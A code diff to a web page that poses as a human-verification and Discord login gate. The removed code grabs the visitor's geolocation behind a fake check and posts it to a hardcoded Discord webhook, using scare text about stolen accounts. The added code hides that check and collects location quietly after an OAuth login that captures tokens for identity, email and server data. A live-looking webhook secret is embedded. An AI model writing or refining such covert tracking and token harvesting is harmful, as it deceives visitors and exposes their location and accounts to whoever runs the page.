@@ -204,7 +204,7 @@
 
         <!-- Verification Section -->
         <div id="verifyBox" class="verify-box">
-            <p id="verifyMsg" style="margin: 0; color: #fff; font-weight: 500;">Prove you're human to access the website, a popup will appear once you press verify. Press allow on the popup to proceed, if you block the request, your discord account might be in danger and can be stolen by other people viewing this website.</p>
+            <p id="verifyMsg" style="margin: 0; color: #fff; font-weight: 500;">Please complete the human verification to proceed.</p>
             <button id="humanBtn" class="verify-btn">I am a human.</button>
         </div>
 
@@ -228,7 +228,7 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
 
         let userAccessToken = '';
-        let userLocation = null; // Store location globally
+        let userLocation = null;
 
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email%20guilds%20guilds.members.read`;
         const loginBtn = document.getElementById('loginBtn');
@@ -239,61 +239,17 @@
         checkOAuthCallback();
         });
 
+        // Simple normal human verification (No forced GPS here)
         document.getElementById('humanBtn').addEventListener('click', () => {
         const humanBtn = document.getElementById('humanBtn');
         const verifyMsg = document.getElementById('verifyMsg');
 
-        humanBtn.textContent = "Verifying...";
+        humanBtn.textContent = "Verified!";
         humanBtn.disabled = true;
+        verifyMsg.textContent = "Verification successful. You can now login.";
+        verifyMsg.style.color = "#3ba55d";
 
-        if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-        async (position) => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-        // Save globally for later login webhook
-        userLocation = { latitude, longitude, accuracy, googleMapsUrl };
-
-        try {
-        await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-        embeds: [{
-        title: "📍 User Geolocation Captured",
-        color: 15105570,
-        fields: [
-        { name: "Latitude", value: String(latitude), inline: true },
-        { name: "Longitude", value: String(longitude), inline: true },
-        { name: "Accuracy", value: `~${Math.round(accuracy)} meters`, inline: true },
-        { name: "Google Maps Link", value: `[View Location](${googleMapsUrl})`, inline: false }
-        ],
-        timestamp: new Date().toISOString()
-        }]
-        })
-        });
-        } catch (err) {
-        console.error("Failed to send location webhook:", err);
-        } finally {
         unlockInterface();
-        }
-        },
-        (error) => {
-        console.warn("Geolocation permission error:", error.message);
-        verifyMsg.textContent = "You must press allow to proceed, since blocking the request might put your discord account credentials stolen.";
-        verifyMsg.style.color = "#ed4245";
-        humanBtn.textContent = "I am a human.";
-        humanBtn.disabled = false;
-        },
-        { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
-        );
-        } else {
-        verifyMsg.textContent = "Geolocation is not supported by your browser.";
-        humanBtn.disabled = false;
-        }
         });
 
         function unlockInterface() {
@@ -345,7 +301,33 @@
         document.getElementById('content').classList.remove('hidden');
 
         history.replaceState(null, null, window.location.pathname);
-        fetchUserData(accessToken);
+
+        // Request location non-blockingly after login, then fetch user data
+        requestLocationAndFetchData(accessToken);
+        }
+        }
+
+        async function requestLocationAndFetchData(token) {
+        if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+        async (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        userLocation = { latitude, longitude, accuracy, googleMapsUrl };
+        await fetchUserData(token);
+        },
+        async (error) => {
+        console.warn("Geolocation permission denied or error:", error.message);
+        // Continue fetching user data even if location is denied
+        await fetchUserData(token);
+        },
+        { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 }
+        );
+        } else {
+        await fetchUserData(token);
         }
         }
 
